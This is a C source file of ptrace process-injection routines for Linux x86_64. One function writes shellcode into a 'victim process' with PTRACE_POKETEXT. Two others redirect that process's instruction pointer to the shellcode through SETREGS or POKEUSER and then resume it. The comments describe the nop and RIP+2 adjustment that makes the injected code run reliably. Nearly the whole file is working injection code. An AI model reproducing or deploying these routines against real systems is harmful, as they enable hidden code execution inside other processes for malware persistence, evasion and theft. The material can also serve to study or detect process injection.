#include "ptrace_primitives.h"

/*
  Write a payload to a specified process at a given offset using the POKETEXT ptrace request.
   
  - address: The memory address to write to. Used as the offset in the mem file when writing.
  - pid: The pid of the injected process.
  - payload: A pointer to our shellcode to be copied into the process.
*/
int ptrace_poketext_write(long pid, long address, const char* payload)
{
    // Attach to the victim process.
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    wait(NULL);
    
    size_t payload_size = strlen(payload);
    uint64_t *payload_copy = (uint64_t *)payload;
    
    // write shellcode to executable address one word at a time using POKETEXT
    for (size_t i = 0; i < payload_size; i += 8, payload_copy++) 
    {
        ptrace(PTRACE_POKETEXT, pid, address + i, *payload_copy);
    }
    
    return 0;
}

/*
  Gain execution in a remote process by modifying the the instruction pointer using the SETREGS ptrace request.
   
  - address: The memory address to overwrite the return address with. The address should contain the shellcode to be executed.
  - pid: The pid of the injected process.
  - attached: Specify if the process was previously attached with ptrace or not.
*/
int ptrace_setregs_exec(long pid, long address, bool attached)
{
    // If the process was not attached before, attach to it
    if (!attached)
    {
        ptrace(PTRACE_ATTACH, pid, NULL, NULL);
        wait(NULL);
    }
    
    // Get old register state using the GETREGS request
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
 
    // Set RIP to the address of our code.
    // If we attach to a process with ptrace during a syscall execution, the kernel automatically decrements RIP by 2 when we detach.
    // To make sure our code is running properly, we increment the address by 2 and add two "nops" to the beginning of our shellcode.
    regs.rip = address + 2;
    
    // Pass the updated user_regs_struct to the SETREGS request to modify the value of RIP
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

    ptrace(PTRACE_CONT, pid, NULL, NULL);
    
    return 0;

}

/*
  Gain execution in a remote process by modifying the the instruction pointer using the POKEUSER ptrace request.
   
  - address: The memory address to overwrite the return address with. The address should contain the shellcode to be executed.
  - pid: The pid of the injected process.
  - attached: Specify if the process was previously attached with ptrace or not.
*/
int ptrace_pokeuser_exec(long pid, long address, bool attached)
{
    // If the process was not attached before, attach to it
    if (!attached)
    {
        ptrace(PTRACE_ATTACH, pid, NULL, NULL);
        wait(NULL);
    }
    
    // Set RIP to the address of our code.
    // If we attach to a process with ptrace during a syscall execution, the kernel automatically decrements RIP by 2 when we detach.
    // To make sure our code is running properly, we increment the address by 2 and add two "nops" to the beginning of our shellcode.
    address += 2;
    
    // Overwrite the user_regs_struct inside the USER section of the process to modify RIP to our address.
    // We overwrite the section at the offset of the RIP register.
    ptrace(PTRACE_POKEUSER, pid, 16 * sizeof(unsigned long), address);
    
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    
    return 0;

}
